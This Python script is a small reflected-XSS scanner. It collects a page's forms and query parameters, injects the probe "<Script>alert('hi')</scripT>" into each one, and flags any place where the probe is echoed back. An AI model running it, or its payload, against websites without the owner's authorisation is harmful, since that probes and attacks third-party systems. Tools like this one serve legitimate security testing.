import requests, sys
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse, parse_qs


def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    print(f"[+] Submitting malicious payload to {target_url}")
    # print(f"[+] Data: {data}")
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)


def scan_xss(url):
    forms = get_all_forms(url)
    print("                                                 ")
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<Script>alert('hi')</scripT>"
    is_vulnerable = False

    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
    return is_vulnerable


def scan_xss_in_url(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    print(f"[+] Detected {len(query_params)} query parameters on {url}.")
    js_script = "<Script>alert('hi')</scripT>"
    is_vulnerable = False

    for param, values in query_params.items():
        for value in values:
            malicious_url = url.replace(value, js_script)
            response = requests.get(malicious_url)
            content = response.content.decode()
            if js_script in content:
                print(f"[+] XSS Detected on {url}")
                print(f"[*] Affected parameter: {param}")
                is_vulnerable = True
                break

    return is_vulnerable


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <URL>")
        sys.exit(1)

    url = sys.argv[1]
    if url.startswith('http://') or url.startswith('https://'):
        pass
    else:
        url = 'https://' + url
    is_vulnerable_form = scan_xss(url)
    is_vulnerable_url = scan_xss_in_url(url)

    if is_vulnerable_form or is_vulnerable_url:
        print("The URL is vulnerable to XSS attacks.")
    else:
        print("No XSS vulnerabilities found.")
